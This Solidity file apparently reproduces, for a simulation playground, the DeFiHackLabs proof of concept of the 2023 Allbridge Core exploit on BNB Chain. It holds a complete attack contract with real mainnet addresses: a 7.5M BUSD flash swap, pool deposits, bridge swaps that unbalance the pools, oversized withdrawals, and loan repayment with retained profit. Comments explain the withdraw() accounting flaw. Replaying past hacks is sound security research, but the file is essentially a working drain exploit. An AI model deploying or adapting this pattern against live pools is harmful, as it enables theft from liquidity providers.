// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Allbridge_exp2).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest.testExploit() flash-swaps BUSD from a PancakeSwap V2 pair, and
// the flash-swap callback `pancakeCall` — which does all the real work — lives
// on the test contract itself). There is no standalone exploit contract to
// deploy, so this is a faithful, self-contained copy of that inline attack
// (testExploit -> run(), pancakeCall unchanged) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/Allbridge_exp2.sol in the registry.
//
// Root cause: Allbridge Core's Pool.withdraw() burns LP and subtracts the SAME
// `amountSP` from both the real `tokenBalance` and the virtual `vUsdBalance`,
// then pays out `amountSP` in real token. When the pool is deliberately
// unbalanced (vUsdBalance >> tokenBalance) via a cross-pool bridge swap before
// withdrawing, `_preWithdrawSwap` anchors `amountSP` to the inflated virtual
// side, so `withdraw` drains far more real stablecoin than the LP's true share.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBridgeSwap {
    function swap(uint256 amount, bytes32 token, bytes32 receiveToken, address recipient) external;
}

interface ISwap {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface IAllBridgePool {
    function tokenBalance() external view returns (uint256);
    function vUsdBalance() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 amountLp) external;
}

contract AllbridgeDrain {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBridgeSwap constant BridgeSwap = IBridgeSwap(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    ISwap constant Swap = ISwap(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    IAllBridgePool constant USDTPool = IAllBridgePool(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    IAllBridgePool constant BUSDPool = IAllBridgePool(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    IUniPairV2 constant Pair = IUniPairV2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    // step 0: flash-swap 7.5M BUSD from the PancakeSwap BUSD/USDT pair.
    // Pair.token1 == BUSD, so amount1Out is set and amount0Out is 0 (matches
    // the on-chain attack transaction and the DeFiHackLabs PoC exactly).
    function run() external {
        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        BUSD.approve(address(Swap), type(uint256).max);
        USDT.approve(address(Swap), type(uint256).max);
        BUSD.approve(address(BUSDPool), type(uint256).max);
        USDT.approve(address(USDTPool), type(uint256).max);

        // step 1: pre-position USDT and seed the BUSD pool.
        Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);
        BUSDPool.deposit(5_000_000 * 1e18); // cheap LP while the pool is still balanced
        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);
        USDTPool.deposit(2_000_000 * 1e18);

        // step 2: unbalance #1 — bridge-swap the attacker's USDT into BUSD,
        // pushing the BUSD pool's vUsdBalance far above its tokenBalance.
        bytes32 token = bytes32(uint256(uint160(address(USDT))));
        bytes32 receiveToken = bytes32(uint256(uint160(address(BUSD))));
        BridgeSwap.swap(USDT.balanceOf(address(this)), token, receiveToken, address(this));

        // step 3: THE DRAIN — withdraw() burns LP on the imbalanced pool;
        // _preWithdrawSwap anchors the payout to the inflated vUsd side and
        // pays it out in scarce real BUSD.
        BUSDPool.withdraw(4_830_262_616);

        // step 4: unbalance #2 — push value into the USDT pool.
        BridgeSwap.swap(40_000 * 1e18, receiveToken, token, address(this));
        USDTPool.withdraw(1_993_728_530);

        // step 5: consolidate looted USDT back to BUSD, then repay the flash
        // loan (principal + PancakeSwap's 0.3% fee). Surplus is kept profit.
        Swap.swap(address(USDT), address(BUSD), USDT.balanceOf(address(this)), 1, address(this), block.timestamp);
        BUSD.transfer(address(Pair), 7_522_500 * 1e18);
    }
}
